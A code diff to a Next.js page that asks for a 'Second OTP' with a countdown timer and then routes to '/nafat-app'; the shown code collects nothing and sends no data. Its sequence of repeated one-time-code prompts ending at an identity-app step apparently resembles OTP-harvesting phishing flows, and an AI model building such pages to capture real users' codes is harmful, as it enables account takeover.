@@ -1,7 +1,7 @@
 import { Pagination, Autoplay, A11y, EffectCards } from 'swiper/modules'
 import { Swiper, SwiperSlide } from 'swiper/react'
 import SwiperCore from 'swiper'
-import { useRouter } from 'next/navigation'
+import { useRouter, useSearchParams } from 'next/navigation'
 
 // Import Swiper styles
 import 'swiper/css'
@@ -14,8 +14,8 @@ import { FaArrowRightLong } from 'react-icons/fa6'
 import { useEffect, useState } from 'react'
 
 const SecondOtp = () => {
-  const router = useRouter()
   SwiperCore.use([Autoplay])
+  const router = useRouter()
   // a countdown timer function
   const [time, setTime] = useState(180)
   useEffect(() => {
@@ -33,7 +33,7 @@ const SecondOtp = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault()
-    router.push('/second-otp')
+    router.push('/nafat-app')
   }
 
   return (
@@ -83,7 +83,7 @@ const SecondOtp = () => {
         </SwiperSlide>
       </Swiper>
       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
-        <h1 className="text-4xl font-bold text-gray-600 mt-10">First OTP</h1>
+        <h1 className="text-4xl font-bold text-gray-600 mt-10">Second OTP</h1>
         {/* a countdown timer for 180s design */}
         <div className="flex justify-center items-center gap-2 mt-5 border-4 h-28 w-28 rounded-full">
           <h1 className="text-2xl font-bold text-gray-600 m-0">
@@ -96,24 +96,24 @@ const SecondOtp = () => {
           <div className="relative z-0 w-full mb-6 group">
             <input
               type="number"
-              name="identity"
-              id="identity"
+              name="secondOtp"
+              id="secondOtp"
               className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
               placeholder=""
               required
             />
             <label
-              for="identity"
+              htmlFor="secondOtp"
               className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
             >
-              Enter Your First OTP
+              Enter Your Second OTP
             </label>
           </div>
           <button
             type="submit"
             className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
           >
-            Next <FaArrowRightLong size={16} />
+            Continue to Proceed <FaArrowRightLong size={16} />
           </button>
         </form>
       </div>
